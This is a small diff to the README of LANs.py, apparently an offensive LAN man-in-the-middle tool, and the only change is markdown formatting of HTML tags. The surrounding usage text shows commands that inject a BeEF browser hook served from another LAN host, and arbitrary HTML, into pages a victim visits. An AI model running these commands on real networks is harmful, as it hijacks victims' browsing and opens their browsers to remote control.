@@ -51,14 +51,14 @@ python LANs.py -u -p -d -ip 192.168.0.10
 python LANs.py -b http://192.168.0.5:3000/hook.js
 ```
 
-Inject a BeEF hook URL (http://beefproject.com/, tutorial: http://resources.infosecinstitute.com/beef-part-1/) into pages the victim visits. This just wraps the argument in <script> tags so you can really enter any location of a javascript file. Attempts to insert it after the first </head> tag found in the page's HTML.
+Inject a BeEF hook URL (http://beefproject.com/, tutorial: http://resources.infosecinstitute.com/beef-part-1/) into pages the victim visits. This just wraps the argument in `<script>` tags so you can really enter any location of a javascript file. Attempts to insert it after the first </head> tag found in the page's HTML.
 
 
 ``` shell
 python LANs.py -c '<title>Owned.</title>'
 ```
 
-Inject arbitrary HTML into pages the victim visits. First tries to inject it after the first <head> tag and failing that, injects prior to the first </head> tag. This example will change the page title to 'Owned.'
+Inject arbitrary HTML into pages the victim visits. First tries to inject it after the first `<head>` tag and failing that, injects prior to the first `</head>` tag. This example will change the page title to 'Owned.'
 
 
 ### Read from pcap:
